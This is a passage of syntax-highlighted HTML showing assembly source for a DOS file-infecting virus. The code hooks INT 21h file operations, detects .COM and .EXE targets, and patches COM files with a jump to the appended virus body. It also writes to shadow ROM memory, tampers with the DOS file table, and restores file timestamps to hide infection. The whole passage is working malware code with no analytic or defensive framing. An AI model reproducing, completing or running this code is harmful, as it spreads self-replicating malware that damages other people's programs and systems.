                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">popa</span>
&nbsp;
alt_21<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> magic_i
                <span style="color: #00007f; font-weight: bold;">je</span>      ax_magic_i
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">04Bh</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      infect_dsdx
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">03Dh</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      infect_dsdx
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">043h</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      infect_dsdx
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">056h</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      infect_dsdx
&nbsp;
int21_exit<span style="color: #339933;">:</span>     <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0eah</span>
old21           <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
&nbsp;
ax_magic_i<span style="color: #339933;">:</span>     IFDEF   DEBUG
                <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3</span>
                ELSE
                <span style="color: #00007f; font-weight: bold;">nop</span>
                ENDIF
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> magic_o
                <span style="color: #00007f; font-weight: bold;">iret</span>
&nbsp;
<span style="color: black; font-style: italic;">;;</span>
&nbsp;
shadow_open<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">pushf</span>
                <span style="color: #00007f; font-weight: bold;">cli</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    reg_save
                <span style="color: #00007f; font-weight: bold;">call</span>    get_sh_state
                <span style="color: #00007f; font-weight: bold;">or</span>      sh_w<span style="color: #339933;">,</span> seg_c000_32k
                <span style="color: #00007f; font-weight: bold;">and</span>     sh_c<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">NOT</span> seg_c000_32k
                <span style="color: #00007f; font-weight: bold;">call</span>    set_sh_state
                <span style="color: #00007f; font-weight: bold;">call</span>    reg_load
                <span style="color: #00007f; font-weight: bold;">popf</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
int03<span style="color: #339933;">:</span>          <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">iret</span>
&nbsp;
shadow_close<span style="color: #339933;">:</span>   <span style="color: #00007f; font-weight: bold;">pushf</span>
                <span style="color: #00007f; font-weight: bold;">cli</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    reg_save
                <span style="color: #00007f; font-weight: bold;">call</span>    get_sh_state
                <span style="color: #00007f; font-weight: bold;">and</span>     sh_w<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">NOT</span> seg_c000_32k
                <span style="color: #00007f; font-weight: bold;">or</span>      sh_c<span style="color: #339933;">,</span> seg_c000_32k
                <span style="color: #00007f; font-weight: bold;">call</span>    set_sh_state
                <span style="color: #00007f; font-weight: bold;">call</span>    reg_load
                <span style="color: #00007f; font-weight: bold;">popf</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
reg_save<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_eax<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ebx<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ecx<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_edx<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_esi<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_edi<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ebp<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebp</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
reg_load<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_eax
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ebx
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ecx
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_edx
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_esi
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_edi
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ebp
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
save_eax        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_ebx        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_ecx        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_edx        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_esi        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_edi        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
save_ebp        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
&nbsp;
                locals  @@
include         sh<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>
                locals  __
&nbsp;
<span style="color: black; font-style: italic;">;;</span>
&nbsp;
infect_dsdx<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">pusha</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ds</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">87h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0fh</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">les</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>temp_ptr
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">cld</span>
                segcs
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">09ah</span>
                <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_temp_ptr <span style="color: #339933;">+</span> infect_file<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">popa</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">jmp</span>     int21_exit
&nbsp;
temp_ptr        <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_temp_ptr
&nbsp;
infect_file<span style="color: #339933;">:</span>    IFDEF   DEBUG
                <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3</span>
                ELSE
                <span style="color: #00007f; font-weight: bold;">nop</span>
                ENDIF
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">87h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">60h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                mve     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">cld</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">lodsb</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     __1
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">lodsd</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">20202000h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'moc.'</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __2
                <span style="color: #00007f; font-weight: bold;">call</span>    infect_com
                <span style="color: #00007f; font-weight: bold;">jmp</span>     __exit
&nbsp;
__2<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'exe.'</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __3
                <span style="color: #00007f; font-weight: bold;">call</span>    infect_exe
                <span style="color: #00007f; font-weight: bold;">jmp</span>     __exit
__3<span style="color: #339933;">:</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0FFh</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">87h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                IFDEF   DEBUG
                <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3</span>
                ELSE
                <span style="color: #00007f; font-weight: bold;">nop</span>
                ENDIF
&nbsp;
                retf
&nbsp;
call21<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">pushf</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>old21
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
file_init<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2fh</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">bx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span>
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> dta
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4eh</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span><span style="color: #ff0000;">32</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
file_open<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">cmp</span>     dosver<span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __1
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4301h</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3d02h</span>
                <span style="color: #00007f; font-weight: bold;">jmp</span>     __2
&nbsp;
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3d00h</span>
__2<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
file_close<span style="color: #339933;">:</span>     mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3eh</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     dosver<span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4301h</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_attr
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> filename
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
infect_com<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">call</span>    file_init
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    check_avail
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    file_open
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3fh</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> orig
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> orig_size
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     orig<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr file_id_offs<span style="color: #339933;">,</span> file_id
                <span style="color: #00007f; font-weight: bold;">je</span>      __settime
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4202h</span>
                <span style="color: #00007f; font-weight: bold;">cwd</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     zero_ptr<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">100h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     start_ptr<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> orig
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> compatch
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> orig_size
                mve     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">cld</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     compatch<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0E9h</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> com_start<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     compatch<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     compatch<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr file_id_offs<span style="color: #339933;">,</span> file_id
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    infect_1
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> compatch
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> orig_size
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">inc</span>     com_counter
&nbsp;
__settime<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">call</span>    set_v_time
&nbsp;
__close<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">call</span>    file_close
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
set_v_time<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">call</span>    fuck_sft
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5701h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_date
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">ch</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
fuck_sft<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">pusha</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>dosver<span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1220h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">2fh</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1216h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">2fh</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">2</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0002h</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">popa</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
com_counter     <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">8</span>       <span style="color: black; font-style: italic;">; hehe</span>
exe_counter     <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">31</span>
&nbsp;
check_avail<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_size<span style="color: #339933;">.</span>o
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_size<span style="color: #339933;">.</span>s
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     __exit
